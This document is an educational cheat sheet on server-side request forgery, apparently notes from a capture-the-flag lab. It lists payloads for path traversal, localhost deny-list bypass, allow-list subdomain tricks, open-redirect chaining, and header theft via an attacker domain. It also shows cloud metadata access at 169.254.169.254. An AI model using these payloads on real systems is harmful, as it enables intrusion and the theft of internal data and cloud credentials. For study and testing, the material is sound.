## 📌 What is SSRF?
**SSRF (Server-Side Request Forgery):** A vulnerability that allows an attacker to manipulate a web server into making requests to an unintended location, such as internal network services, private files, or external malicious servers.

**Analogy:** Instead of asking a waiter (the server) to "ask the chef if there is salt," you tell the waiter, "Go open the chef's cash register and bring me the money," and the waiter does it without questioning you. The server blindly trusts user input (URLs, paths, etc.).

---

## 🎯 SSRF Types and Exploitation Logic

### 1. Basic SSRF
Simply replacing the server's expected URL with one of your choosing.
- **Expected:** `http://website.com/stock?url=http://api.website.com/item`
- **Attack (Payload):** `http://website.com/stock?url=http://api.website.com/api/user` (Fetches restricted user data).

### 2. Directory Traversal (Path SSRF)
If the server forces a prefix (e.g., always goes to `/api/stock/`), use `../` to move up a directory and reach restricted areas.
- **Payload:** `?url=../user` (The server interprets this as `/api/stock/../user`, effectively moving to `/api/user`).

### 3. Parameter Manipulation (Bypass)
If the server automatically appends text (like `.website.thm/api`) to your input, use a **Question Mark (`?`)** or **Ampersand (`&`)** to nullify the suffix.
- **Payload:** `?server=api.hacker.com?` or `&x=`
- **Logic:** The `?` or `&x=` turns any subsequent server-appended text into a harmless query parameter (junk data).

### 4. Credential/Header Theft
The server might send secret API keys or tokens in HTTP headers when talking to authorized APIs.
- **Tactic:** Redirect the server to your own controlled domain (`hacker.com`). The server will send the sensitive headers/authentication data to your domain, allowing you to intercept them.

---

## 🔍 Where to Look for SSRF

Look for areas where the server fetches data from user-supplied inputs:
1. **Full URLs in Address Bar:** `?server=http://...`
2. **Hidden Form Fields:** Check `<input type="hidden" name="server" value="...">` via Browser Inspect (F12).
3. **Partial Hostnames:** `?server=api` (Inputs that only specify the subdomain).
4. **URL Paths:** `?dst=/forms/contact`

---

## 🛡️ Bypass Techniques

Strategies to overcome developer-implemented security barriers:

### 1. Deny List Bypass
If `127.0.0.1` or `localhost` is blocked:
- Use alternatives: `0`, `0.0.0.0`, `127.1`, `2130706433` (Decimal), or `127.0.0.1.nip.io`.

### 2. Allow List Bypass
If the site only allows `https://website.thm`:
- **Subdomain Trick:** Use `https://website.thm.attacker-domain.com`. The filter checks if it *starts* with the allowed string and approves the request.

### 3. Open Redirect
If rules are too strict, use an existing "open redirect" feature on the target site (e.g., `https://website.thm/link?url=...`). Use this as a "Trojan Horse" to bounce the request to your target.

---

## 🛠️ Practical Application Notes (Data Extraction)

**Scenario:** Identifying SSRF via a profile avatar selection form.

1. **Discovery:** Inspect the avatar form (F12). If you see `value="assets/avatars/1.png"`, the server is fetching the file.
2. **Bypass:** If `value="/private"` is blocked, use directory traversal: `value="x/../private"`.
3. **Extraction (Base64):** If the server attempts to display the "file" as an image, it often encodes the file content in Base64:
   `data:image/png;base64,iVBORw0KGgo...`
   *Solution:* Copy this Base64 string from the Page Source and decode it (via CyberChef or an online decoder) to reveal the sensitive file content or flag.

---

## 💡 Pro Tips
> - **Blind SSRF:** If there is no response, use tools like RequestBin, Webhook.site, or Burp Collaborator to see if the server "pings" your machine.
> - **Cloud Metadata:** If you find SSRF in a cloud environment (AWS/GCP/Azure), immediately attempt to reach `http://169.254.169.254/`. This endpoint often contains sensitive server configuration and cloud credentials.